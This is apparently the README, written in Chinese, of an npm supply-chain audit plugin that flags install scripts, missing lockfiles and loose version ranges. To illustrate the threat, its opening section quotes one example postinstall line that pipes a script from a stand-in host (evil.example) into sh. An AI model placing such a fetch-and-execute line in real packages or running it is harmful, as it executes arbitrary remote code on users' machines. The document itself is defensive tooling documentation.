# @deepwhale-cn/dsh-dep-audit

[![Listed on dsh-plugin.org](https://dsh-plugin.org/badges/listed.svg)](https://dsh-plugin.org/plugins/feely0208/dsh-dep-audit)


**关键词**：依赖投毒 · 供应链攻击 · 恶意依赖 · npm 投毒 · postinstall 脚本 · 供应链安全 · 依赖审计
**Keywords**: dependency poisoning · supply chain attack · malicious package · npm supply chain · postinstall script
**依赖投毒与风险** —— 装包即执行的脚本、过宽版本、非 registry 来源。

## 不装它会怎样

你 `npm install` 了一个看起来正常的包。

它的 `postinstall` 脚本里有一行 `curl evil.example/x.sh | sh` ——
**在你装它的那一刻就执行了**，你甚至没在代码里 import 过它。

近年的大规模 npm 投毒事件（event-stream、ua-parser-js、node-ipc、colors/faker）**全是这条路**。

## 它查什么

| 级别 | 内容 |
|---|---|
| 🔴 高 | 依赖带 install/postinstall 脚本 |
| 🟡 中 | 没有 lockfile · 版本用 `*`/`latest` · git/http 来源 |
| 🟢 低 | `>=x.y.z` 无上界 |

## 安装

```bash
dsh plugin --profile web add @deepwhale-cn/dsh-dep-audit
# 或纯 CLI
npx @deepwhale-cn/dsh-dep-audit
```

## 用法

```bash
dsh-dep-audit                 # 扫当前目录
dsh-dep-audit --demo          # 看检出效果
dsh-dep-audit --html r.html   # HTML 报告
```

![dsh-dep-audit 的检查报告示例](https://raw.githubusercontent.com/feely0208/dsh-dep-audit/main/docs/report.png)

## 边界

- **带 install 脚本 ≠ 恶意** —— `esbuild`/`sharp`/`puppeteer` 这类必须有，已在白名单里。
  报出来的需要你人工确认。
- **不查 CVE 漏洞库**、**不做包名相似度检测**（typosquat 误报率高）。

本插件是一个工具。使用者必须遵守所在地区法律法规，**对使用本项目造成的任何后果自行承担责任。**

## License

MIT © 深鲸 DeepWhale
